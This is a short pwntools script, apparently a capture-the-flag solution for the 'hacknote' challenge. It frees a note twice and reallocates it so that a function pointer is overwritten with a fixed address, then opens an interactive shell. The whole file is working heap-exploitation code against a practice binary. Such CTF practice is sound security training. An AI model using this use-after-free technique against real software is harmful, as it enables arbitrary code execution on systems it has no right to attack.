from pwn import*
#p=remote('node4.buuoj.cn',26275)
p=process('./hacknote')
context.log_level='debug'

def add(size,context):
    p.sendlineafter(b'Your choice :',b'1')
    p.sendlineafter(b'Note size :',str(size).encode('latin'))
    p.sendlineafter(b'Content :',context)
def delete(index):
    p.sendlineafter(b'Your choice :',b'2')
    p.sendlineafter(b'Index :',str(index).encode('latin'))
def puts_val(index):
    p.sendlineafter(b'Your choice :',b'3')
    p.sendlineafter(b'Index :',str(index).encode('latin'))

sys=0x8048945
add(8,b'a')
delete(0)
#gdb.attach(p)
delete(0)
#gdb.attach(p)
add(40,b'a')
#gdb.attach(p)
add(8,p32(sys))

puts_val(0)

p.interactive()